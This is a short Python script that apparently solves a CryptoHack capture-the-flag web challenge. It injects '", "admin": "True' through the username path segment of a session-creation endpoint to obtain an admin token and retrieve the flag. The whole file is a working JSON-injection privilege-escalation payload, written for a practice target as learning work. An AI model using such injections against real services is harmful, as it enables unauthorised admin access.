import json, requests
#for this challenge i used requests to send and receive data from listed endpoints. I can
#see from the source code that the username variable appears after the declaration of the admin
#in the body variable so i can inject code into the create_session endpoint to change my
#token to an admin token by using the parameters below.
username = '", "admin": "True'
#here i am creating a token that with the username credentials above ie admin.
token = json.loads(requests.get(f"https://web.cryptohack.org/json-in-json/create_session/{username}/").text)["session"]

print(token)
#i then use the token on the interaction page in the authorise token bit to get the output with the flag